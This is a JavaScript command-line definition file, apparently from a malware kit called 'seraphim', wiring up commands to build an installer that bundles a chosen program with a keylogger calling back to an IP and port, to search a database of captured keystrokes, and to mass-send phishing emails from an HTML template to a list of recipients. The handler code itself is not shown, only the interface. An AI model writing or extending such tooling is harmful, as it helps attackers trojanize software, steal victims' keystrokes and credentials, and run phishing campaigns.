import {
  buildCommandHandler,
  handleKeyloggerDatabaseSearch,
  sendEmailHandler,
  serverDownHandler,
  serverUpHandler,
  showStatusHandler,
} from "./utils.js";

export function addServerCommand(program) {
  const serverCmd = program.command("server").description("Manage the server");

  serverCmd
    .command("up")
    .summary("start a server")
    .option("--port -p <string>", "port to bind the server", "3000")
    .option("--force", "forces to create the server")
    .action(serverUpHandler);

  serverCmd.command("down").summary("stop a server").action(serverDownHandler);
}

export function addStatusCommand(program) {
  const statusCmd = program
    .command("status")
    .summary("summarize seraphim status")
    .action(showStatusHandler);
}

export function addBuildCommand(program) {
  const build = program
    .command("build")
    .argument("<string>", "path to the binary folder")
    .summary("create an installer for a binary + keylogger")
    .option("-f --folder <folder>")
    .option("-e --executable <executable>")
    .option("-s --shortcut <shortcut>")
    .option("-i --ip <ip>")
    .option("-p --port <port>")
    .action(buildCommandHandler);
}

export function addSearchCommand(program) {
  const logCmd = program
    .command("search")
    .summary("search on keylogger database")
    .action(handleKeyloggerDatabaseSearch);
}

export function addSendEmail(program) {
  const emailCmd = program
    .command("email")
    .summary("to send e-mail for a list the receivers")
    .option(
      "-a, --archive <archive>",
      "address to the list of receivers in .txt",
    )
    .option(
      "-l, --login <login...>",
      "email and app password for access your e-mail respectively",
    )
    .option(
      "-p, --phishing <phishing>",
      "add your address for phishing email in .html",
    )
    .option("-i --ip <ip>",
      "IP address of the server"
    )
    .action(sendEmailHandler);
}
